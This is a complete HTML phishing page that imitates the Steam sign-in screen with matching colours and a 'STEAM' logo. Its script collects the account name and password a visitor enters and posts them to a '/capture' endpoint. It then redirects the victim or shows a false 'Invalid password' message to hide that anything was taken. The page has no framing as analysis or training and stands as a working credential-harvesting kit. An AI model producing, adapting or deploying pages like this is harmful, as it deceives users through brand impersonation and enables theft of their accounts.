<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign In</title>
<style>
  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#c6d4df}
  .box{background:#181a21;padding:40px 32px;width:380px;border-radius:4px}
  .logo{text-align:center;margin-bottom:24px;color:#fff;font-size:28px;font-weight:bold;letter-spacing:2px}
  h1{font-size:20px;font-weight:400;color:#fff;margin:0 0 20px;text-align:center}
  label{display:block;font-size:12px;color:#1999ff;margin-bottom:4px}
  input{width:100%;background:#32353c;border:none;border-radius:3px;padding:10px;color:#fff;font-size:15px;margin-bottom:16px;box-sizing:border-box;outline:none}
  input:focus{background:#393c44}
  .btn{width:100%;background:linear-gradient(to right,#47bfff,#0e54a9);color:#fff;border:none;padding:10px;border-radius:3px;font-size:15px;cursor:pointer;margin-top:10px}
  .btn:hover{background:linear-gradient(to right,#5fc7ff,#1565c0)}
  .msg{color:#ff5c5c;font-size:13px;margin-top:12px;text-align:center}
</style>
</head>
<body>
<div class="box">
  <div class="logo">STEAM</div>
  <h1>Sign in</h1>
  <form id="f">
    <label>Sign in with account name</label>
    <input name="user" type="text" required autofocus>
    <label>Password</label>
    <input name="pass" type="password" required>
    <button type="submit" class="btn">Sign in</button>
    <p id="msg" class="msg"></p>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const fd = new FormData(e.target);
  const r = await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'steam'})});
  const j = await r.json().catch(()=>({}));
  if(j.redirect){window.location=j.redirect;return;}
  document.getElementById('msg').textContent = 'Invalid password or account name.';
});
</script>
</body>
</html>
